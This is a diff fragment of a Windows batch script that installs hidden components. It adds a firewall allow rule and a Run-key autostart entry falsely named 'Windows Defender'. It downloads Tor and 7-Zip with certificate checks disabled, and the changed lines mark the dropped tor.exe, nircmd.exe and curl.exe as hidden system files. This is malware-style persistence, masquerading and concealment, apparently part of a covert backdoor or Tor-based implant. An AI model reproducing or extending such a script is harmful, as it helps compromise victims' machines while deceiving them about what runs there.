@@ -15,16 +15,16 @@ netsh advfirewall firewall add rule name="apache" dir=in action=allow program="C
 
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%environment%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
 
-copy /y "tor.exe" "%environment%\tor.exe"
-copy /y "nircmd.exe" "%environment%\nircmd.exe"
-copy /y "curl.exe" "%environment%\curl.exe"
+copy /y "tor.exe" "%environment%\tor.exe" && attrib +s +h +i "%environment%\tor.exe"
+copy /y "nircmd.exe" "%environment%\nircmd.exe" && attrib +s +h +i "%environment%\nircmd.exe"
+copy /y "curl.exe" "%environment%\curl.exe" && attrib +s +h +i "%environment%\curl.exe"
 
 "%environment%\curl.exe" -k https://www.7-zip.org/a/7z2201.exe --output "%temp%\7z2201.exe" && "%temp%\7z2201.exe" /S /D="%environment%\7-Zip" && del "%temp%\7z2201.exe" && attrib +s +h +i "%environment%\7-Zip"
 
 
 
 if exist "%environment%\tor.exe" (
-    attrib +s +h +i "%environment%\tor.exe"
+    echo.
 ) else (
 "%environment%\curl.exe" -k -L https://archive.torproject.org/tor-package-archive/torbrowser/12.0.4/tor-expert-bundle-12.0.4-windows-x86_64.tar.gz > "%temp%\Tor.tar.gz" && "%environment%\7-Zip\7z.exe" e "%temp%\Tor.tar.gz" -so | "%environment%\7-Zip\7z.exe" e -aoa -si -ttar "tor/tor.exe" -o"%environment%" -y && attrib +s +h +i "%environment%\tor.exe" && del "%temp%\Tor.tar.gz"
 )
